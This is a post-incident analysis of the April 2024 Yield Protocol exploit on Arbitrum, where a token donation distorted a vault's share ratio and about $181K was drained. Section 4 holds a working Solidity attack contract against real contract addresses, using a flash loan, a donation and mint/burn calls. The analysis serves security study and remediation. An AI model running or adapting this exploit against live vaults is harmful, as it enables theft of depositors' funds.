# Yield Protocol — mintDivested/burnDivested Logic Flaw Analysis

| Item | Details |
|------|---------|
| **Date** | 2024-04 |
| **Protocol** | Yield Protocol |
| **Chain** | Arbitrum |
| **Loss** | ~$181,000 |
| **Attack Contract** | [0xd775fd7b](https://arbiscan.io/address/0xd775fd7b76424a553e4adce6c2f99be419ce8d41) |
| **Vulnerable Contract** | [Strategy 0x3b4FFD93](https://arbiscan.io/address/0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47) |
| **YieldPool** | [0x7012aF43](https://arbiscan.io/address/0x7012aF43F8a3c1141Ee4e955CC568Ad2af59C3fa) |
| **USDC** | [0xFF970A61](https://arbiscan.io/address/0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8) |
| **Root Cause** | When `mintDivested()` and `burnDivested()` are used in combination, a donation of pool tokens to the vault distorts the shares ratio, allowing withdrawal of more USDC than was actually deposited |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/Yield_exp.sol) |

---

## 1. Vulnerability Overview

The Yield Protocol Strategy contract provides `mintDivested()` (USDC → pool token minting) and `burnDivested()` (pool token → USDC burning) functions. An attacker directly donated pool tokens to the Strategy vault to distort the assets-per-share ratio, then used `burnDivested()` to withdraw significantly more USDC than was originally deposited.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: shares ratio distortion via donation
contract YieldStrategy {
    // totalAssets = poolToken.balanceOf(address(this))
    // shares = amount * totalSupply / totalAssets

    function mintDivested(address to) external returns (uint256 minted) {
        uint256 poolTokenIn = poolToken.balanceOf(address(this)) - storedBalance;
        // shares calculated based on storedBalance
        minted = poolTokenIn * totalSupply / storedBalance;
        storedBalance += poolTokenIn;
        _mint(to, minted);
    }

    function burnDivested(address to) external returns (uint256 poolTokenOut) {
        uint256 sharesToBurn = balanceOf(address(this));
        // returned at current totalAssets / totalSupply ratio
        poolTokenOut = sharesToBurn * totalAssets() / totalSupply;
        // ← donated tokens included in totalAssets → excess returned
        storedBalance -= poolTokenOut;
        _burn(address(this), sharesToBurn);
        poolToken.transfer(to, poolTokenOut);
    }
}

// ✅ Safe code: donation prevention + storedBalance consistency
function totalAssets() public view returns (uint256) {
    return storedBalance;  // use only the recorded balance, not the actual balance
}

function burnDivested(address to) external returns (uint256 poolTokenOut) {
    uint256 sharesToBurn = balanceOf(address(this));
    poolTokenOut = sharesToBurn * storedBalance / totalSupply;
    storedBalance -= poolTokenOut;
    _burn(address(this), sharesToBurn);
    poolToken.transfer(to, poolTokenOut);
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: Strategy.sol
    function mintDivested(address to)  // ❌ Vulnerability
        external
        isState(State.DIVESTED)
        returns (uint256 minted)
    {
        // minted = supply * value(deposit) / value(strategy)
        uint256 baseCached_ = baseCached;
        uint256 deposit = base.balanceOf(address(this)) - baseCached_;
        baseCached = baseCached_ + deposit;

        minted = _totalSupply * deposit / baseCached_;

        _mint(to, minted);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Balancer flash loan: 400,000 USDC
  │
  ├─→ [2] 308,000 USDC → YieldPool.mintDivested() → obtain pool tokens
  │
  ├─→ [3] Half of pool tokens → YieldStrategy.mint()
  │         └─ Obtain Strategy shares
  │
  ├─→ [4] Remaining pool tokens → donated directly to YieldStrategy
  │         └─ totalAssets increases, totalSupply unchanged → share value inflated
  │
  ├─→ [5] Call YieldStrategy.burn()
  │         └─ Excess pool tokens returned due to donation
  │
  ├─→ [6] pool tokens → USDC (burnDivested)
  │
  ├─→ [7] Repay Balancer flash loan
  │
  └─→ [8] ~$181K profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IYieldStrategy {
    function mint(address to) external returns (uint256);
    function burn(address to) external returns (uint256);
    function mintDivested(address to) external returns (uint256);
    function burnDivested(address to) external returns (uint256);
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData) external;
}

contract AttackContract {
    IYieldStrategy constant strategy = IYieldStrategy(0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47);
    IYieldStrategy constant pool     = IYieldStrategy(0x7012aF43F8a3c1141Ee4e955CC568Ad2af59C3fa);
    IBalancerVault constant balancer = IBalancerVault(/* Balancer */);
    IERC20 constant USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);

    function testExploit() external {
        address[] memory tokens = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = address(USDC);
        amounts[0] = 400_000e6;
        balancer.flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(address[] memory, uint256[] memory amounts, uint256[] memory fees, bytes memory) external {
        // [1] 308K USDC → transfer to pool + mintDivested
        USDC.transfer(address(pool), 308_000e6);
        uint256 poolTokens = pool.mintDivested(address(this));

        // [2] Half → Strategy.mint
        IERC20(address(pool)).transfer(address(strategy), poolTokens / 2);
        strategy.mint(address(this));

        // [3] Remaining half → donated directly to Strategy
        // totalAssets increases → shares value distorted
        IERC20(address(pool)).transfer(address(strategy), poolTokens / 2);

        // [4] burn → excess poolTokens returned due to donation
        IERC20(address(strategy)).transfer(address(strategy), IERC20(address(strategy)).balanceOf(address(this)));
        uint256 poolTokensBack = strategy.burn(address(this));

        // [5] pool tokens → USDC
        IERC20(address(pool)).transfer(address(pool), poolTokensBack);
        pool.burnDivested(address(this));

        // [6] Repay Balancer
        USDC.transfer(address(balancer), amounts[0] + fees[0]);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|----------|---------|
| **Vulnerability Type** | Shares ratio distortion via token donation |
| **CWE** | CWE-840: Business Logic Error |
| **Attack Vector** | External (flash loan + donate + mintDivested/burnDivested) |
| **DApp Category** | Yield strategy vault (Arbitrum) |
| **Impact** | Theft of vault USDC reserves (~$181K) |

## 6. Remediation Recommendations

1. **Maintain storedBalance consistency**: `totalAssets()` should reflect only the recorded balance, not the actual on-chain balance
2. **Prevent donations**: Design the system so that direct token transfers cannot manipulate totalAssets
3. **ERC-4626 standard compliance**: Ensure safe share calculation using the battle-tested vault standard
4. **Share/asset ratio cap**: Limit ratio changes within a single transaction

## 7. Lessons Learned

- In ERC-4626-style vaults, if `totalAssets()` is based on the actual on-chain balance, direct token transfers (donations) can be used to manipulate share value.
- The same vulnerability pattern has recurred across multiple protocols including Silo Finance and ERC-4626 vaults.
- When designing vaults, `totalAssets()` should use an internal accounting variable and must not directly reflect external balance changes.